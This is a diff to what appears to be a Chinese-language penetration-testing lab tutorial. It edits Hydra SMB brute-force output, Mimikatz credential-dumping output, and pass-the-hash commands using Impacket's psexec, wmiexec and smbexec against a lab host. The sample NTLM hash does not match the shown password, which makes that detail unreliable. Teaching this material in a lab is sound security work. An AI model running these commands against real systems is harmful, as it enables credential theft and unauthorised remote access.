@@ -403,10 +403,10 @@ hydra -L /tmp/users.txt -P /tmp/passwords.txt smb://192.168.1.20
 
 # 预期输出：
 # [DATA] max 16 tasks per 1 server, overall 16 tasks, 60 login tries (l:6/p:10)
-# [3389][smb] host: 192.168.1.20   login: user1   password: 123456
-# [3389][smb] host: 192.168.1.20   login: user2   password: password
-# [3389][smb] host: 192.168.1.20   login: user3   password: P@ssw0rd
-# [3389][smb] host: 192.168.1.20   login: weakadmin   password: admin123
+# [445][smb] host: 192.168.1.20   login: user1   password: 123456
+# [445][smb] host: 192.168.1.20   login: user2   password: password
+# [445][smb] host: 192.168.1.20   login: user3   password: P@ssw0rd
+# [445][smb] host: 192.168.1.20   login: weakadmin   password: admin123
 ```
 
 **步骤4：使用CrackMapExec进行SMB密码喷射**
@@ -494,7 +494,7 @@ sekurlsa::logonpasswords
 # User Name         : weakadmin
 # Domain            : TARGET-SERVER
 # Password          : admin123          ← 明文密码！
-# NTLM              : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+# NTLM              : 31d6cfe0d16ae931b73c59d7e0c089c0  （示例值，实际值取决于密码）
 
 # 导出本地SAM数据库中所有账户的哈希
 lsadump::sam
@@ -514,12 +514,13 @@ sekurlsa::credman
 
 ```bash
 # 在Mimikatz中使用NTLM哈希直接认证（无需明文密码）
-sekurlsa::pth /user:weakadmin /domain:. /ntlm:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+sekurlsa::pth /user:weakadmin /domain:. /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
 ```
 
 ```
 # 从Kali攻击机使用Impacket工具进行PtH
 python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
+# 若上述路径不存在，直接使用：psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
 python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
 python3 /usr/share/doc/python3-impacket/examples/smbexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 weakadmin@192.168.1.20
 ```
